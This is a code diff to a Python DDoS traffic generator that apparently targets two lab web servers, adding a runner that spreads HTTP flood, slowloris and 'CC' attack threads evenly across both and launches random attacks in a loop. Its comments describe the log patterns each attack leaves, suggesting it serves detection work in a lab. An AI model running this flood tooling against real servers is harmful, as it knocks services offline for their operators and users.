@@ -145,6 +145,63 @@ def inc_error():
 
 
 # ============================================================
+# BALANCED MODE - Strict 1:1 distribution between servers
+# ============================================================
+def balanced_attack_runner(attack_func, duration, config, targets=None):
+    """Run an attack with a strict balanced distribution between all targets.
+
+    Each target gets the same (or as-close-as-possible) number of threads.
+    This fixes situations where one server receives far more requests/log lines.
+    """
+    if targets is None:
+        targets = TARGETS
+
+    if not targets:
+        return
+
+    total_threads = int(config.get("threads", 0) or 0)
+    if total_threads <= 0:
+        return
+
+    target_count = len(targets)
+    threads_per_target = total_threads // target_count
+    remainder = total_threads % target_count
+
+    # Ensure every target gets at least one worker if threads < targets (unlikely here).
+    if threads_per_target == 0:
+        threads_per_target = 1
+        remainder = 0
+        total_threads = target_count
+
+    print(
+        f"  Balanced Mode: {threads_per_target} threads/target"
+        + (f" (+{remainder} extra distributed)" if remainder else "")
+    )
+
+    with ThreadPoolExecutor(max_workers=total_threads) as executor:
+        futures = []
+
+        for idx, target in enumerate(targets):
+            n_threads = threads_per_target + (1 if idx < remainder else 0)
+            for _ in range(n_threads):
+                futures.append(
+                    executor.submit(
+                        attack_func,
+                        target["url"],
+                        duration,
+                        config,
+                    )
+                )
+
+        for future in as_completed(futures):
+            # We just wait all workers; errors are counted inside attack functions.
+            try:
+                future.result()
+            except Exception:
+                inc_error()
+
+
+# ============================================================
 # ATTACK 1: HTTP GET FLOOD
 # Send hundreds of GET requests/second to same endpoint
 # Log pattern: Same path "GET /" repeated hundreds of times/second
@@ -354,7 +411,7 @@ def attack_slowloris(target_url, duration, config):
 # Simulate "realistic-looking" traffic but with extremely large volume
 # Log pattern: GET requests look like real users but extremely high RPS, many real User-Agents
 # ============================================================
-def attack_cc(target_url, duration, config, is_bootstrap=True):
+def attack_cc(target_url, duration, config, is_bootstrap=None):
     """
     CC Attack (Challenge Collapsar) - "Realistic-looking traffic" DDoS
     
@@ -375,6 +432,11 @@ def attack_cc(target_url, duration, config, is_bootstrap=True):
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
     ]
     
+    if is_bootstrap is None:
+        # Default heuristic so this function matches the common (url, duration, config) signature.
+        # VM1 BootstrapLP uses port 8080 in this lab setup.
+        is_bootstrap = ":8080" in str(target_url)
+
     if is_bootstrap:
         paths = ["/", "/index.html", "/css/styles.css", "/js/scripts.js",
                  "/#features", "/#testimonials", "/#signup",
@@ -697,7 +759,7 @@ def main():
                        help="Enable manual mode (choose attack type)")
     args = parser.parse_args()
     
-    # Always attack BOTH servers simultaneously
+    # Always attack BOTH servers simultaneously (balanced distribution)
     active_targets = TARGETS
     
     print()
@@ -731,7 +793,7 @@ def main():
     print("=" * 80)
     print("  🔴 AUTOMATIC DDoS MODE - Attacks will launch randomly")
     print("=" * 80)
-    print("  Mode: Random attack type → Random server (1 type, 1 server per attack)")
+    print("  Mode: Random attack type → BOTH servers (balanced 1:1)")
     print("  Attack Duration: 30-90 seconds (random per attack)")
     print("  Interval Between Attacks: 10-30 seconds (random)")
     print("  Attack Intensity: Random (LOW/MEDIUM/HIGH)")
@@ -759,9 +821,6 @@ def main():
     try:
         while True:
             attack_count += 1
-            
-            # Randomly select ONE server for this attack
-            selected_target = random.choice(active_targets)
             
             # Randomly select ONE attack type (no mixed "all")
             attack_choice = random.choice(attack_types)
@@ -792,31 +851,21 @@ def main():
             print(f"  Type:       {attack_names[attack_choice]}")
             print(f"  Intensity:  {intensity} ({config['threads']} threads, burst={config['burst_threads']})")
             print(f"  Duration:   {duration} seconds")
-            print(f"  🎯 Target:  {selected_target['name']} ({selected_target['url']})")
+            print("  🎯 Targets: Balanced across BOTH servers")
+            for t in active_targets:
+                print(f"            → {t['name']} ({t['url']})")
             print("─" * 80)
-            
-            # Launch attack threads for SINGLE server only
-            threads = []
-            
+
             attack_funcs = {
                 "flood": attack_http_get_flood,
                 "post": attack_http_post_flood,
                 "slowloris": attack_slowloris,
-                "cc": lambda url, dur, cfg: attack_cc(url, dur, cfg, "Bootstrap" in selected_target['name']),
+                "cc": attack_cc,
                 "random": attack_random_path_flood,
                 "burst": attack_burst,
             }
-            
+
             func = attack_funcs[attack_choice]
-            num_threads = config["threads"]
-            
-            # Create threads for the selected target only
-            for _ in range(num_threads):
-                threads.append(threading.Thread(
-                    target=func,
-                    args=(selected_target["url"], duration, config),
-                    daemon=True
-                ))
     
             # Monitor thread
             monitor_thread = threading.Thread(
@@ -827,8 +876,7 @@ def main():
             
             # Start attack
             monitor_thread.start()
-            for t in threads:
-                t.start()
+            balanced_attack_runner(func, duration, config, targets=active_targets)
             
             # Wait for attack to complete
             monitor_thread.join()
